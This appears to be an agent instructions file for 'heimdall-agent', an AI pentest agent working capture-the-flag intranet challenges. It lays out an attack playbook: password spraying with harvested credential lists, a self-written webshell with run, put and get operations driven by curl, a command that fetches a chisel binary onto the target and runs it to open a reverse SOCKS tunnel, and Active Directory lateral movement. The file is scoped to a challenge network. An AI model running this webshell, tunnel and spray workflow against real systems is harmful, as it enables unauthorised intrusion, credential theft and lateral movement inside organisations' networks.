## heimdall-agent

> **Goal: get a foothold, move inside, `heimdall-submit`.** Read `input.json` first. On `instance_rotated`, probe the new `container_addr` first.

# Intranet pentest workspace

**Goal: get a foothold, move inside, `heimdall-submit`.** Read `input.json` first. On `instance_rotated`, probe the new `container_addr` first.

| Surface | Tools |
|---|---|
| Path scan | `dirsearch` + `paths.txt`; on first recon use a light scan for intel only |
| Webshell | Write your own simple HTTP webshell and interact with it using `curl` |
| Proxy | **Prefer** reverse chisel (`127.0.0.1:1080`); if callback fails, run chisel server on the target |
| SSH/SQL | `sshpass` `mysql` `psql` `sqlite3` |
| AD | `nxc` `certipy` Impacket (`/opt/heimdall/ad`); serial on the same target |
| Other | `nmap` `curl` `nuclei` `john` `heimdall-ocr`; `chisel` |

## Wordlists

The observer reads logs and steers dumps of **logins and password rules** from already-controlled surfaces (web admin / DB / panel / config / history) into `.heimdall/traffic/loot.json`. Freely expand collected logins and rules into:

- `.heimdall/traffic/spray_users.txt`
- `.heimdall/traffic/spray_passwords.txt`
- `.heimdall/traffic/spray_creds.txt` (`user:pass`)

On a login, first spray the lightweight general-purpose list `/opt/heimdall/tools/wordlists/passwords.txt` against the form username / `admin`. If it misses, use the observer's dynamically generated `.heimdall/traffic/spray_creds.txt` for targeted spraying. Families already in that file and not yet tried on this surface: spray them. No rockyou. An empty file only means this observer tick has not published yet — do not treat that as "no dictionary". When CONFIRMED / the graph shows `DICT`, or `rev` changes, read again. HTTP / SSH / FTP login spray: concurrency 4; wait 0.3–0.5s after a deny; on timeout or No route pause 10s. You may build a targeted spray from intel, but do not invent a huge guessed wordlist that knocks the service over.

## Order

**After RCE, write a simple, stable webshell first, use it for command exec and upload, then build the chisel tunnel, then do post-exploitation.**

External `container_addr` → light path scan → submit the first-surface flag immediately → RCE / DB / panel: read-only intel first (usernames, hashes, config, history, keys, product names, people → loot / `spray_*.txt`) → drop your own shell (exec and upload both via curl) → **prefer reverse chisel** (after a reachable callback IP) → else **chisel server on the target + client here** → `proxychains4`. AD lateral with the toolkit.

## Ports

| | |
|---|---|
| chisel SOCKS | `1080` (`127.0.0.1:1080` on this box) |
| chisel drop | `$CHISEL_DROP` (`/opt/heimdall/proxy/chisel-drop/`) |

## Self-written webshell

Write a small HTTP helper in the target language, drop it on a web-reachable path, and record the secret in `progress.md`. Exec and upload **default to this helper**. Use `curl --data-urlencode`. Prove `whoami` before anything else. Do not overwrite the live shell.

Implement these yourself (no key → 404):
- `op=run`: execute `c`, return raw stdout+stderr
- `op=put`: decode `b64` onto `path`
- `op=get`: read `path`, return raw bytes/text
- Long jobs: `run` `nohup ... >/tmp/job.log 2>&1 & echo $!`, then poll with `run`/`get` until finished

```bash
# Write the source to artifacts/ first, drop it with the current RCE, then keep SHELL_URL / SHELL_KEY
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=whoami"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=put" --data-urlencode "path=/tmp/x" --data-urlencode "b64=$(base64 -w0 ./local_x)"
```

## Proxy
No outbound net, but the target and this box share a LAN; you may run the server here.

```bash
# Prefer reverse chisel (set REACHABLE_IP only after the target gets HTTP 200 from this box)
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$CHISEL_DROP"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=curl -fsSL http://$REACHABLE_IP:8000/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel"
"$CHISEL_DROP/chisel_linux_amd64" server --reverse --socks5 --host 0.0.0.0 --port 8080
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=nohup /tmp/chisel client http://$REACHABLE_IP:8080 R:socks >/tmp/chisel.log 2>&1 & echo $!"
# Fallback (all callbacks timeout): start `chisel server --socks5 --host 0.0.0.0 --port 1080` on the target via the helper, then `chisel client http://TARGET:1080 socks` here. If that port is closed, keep running intranet commands through the helper.
```

## Hard rules

- Scope = `container_addr` / the challenge net.
- Read-only enum first; confirm you need the flag before changing the domain / dumping creds.
- `flag{...}` → submit immediately. After instance rotate, old IPs are dead (`dead_hosts`).

---
> Source: [QiantangCredit/heimdall-agent](https://github.com/QiantangCredit/heimdall-agent) — distributed by [TomeVault](https://tomevault.io).
<!-- tomevault:4.0:copilot_instructions:2026-10-01 -->
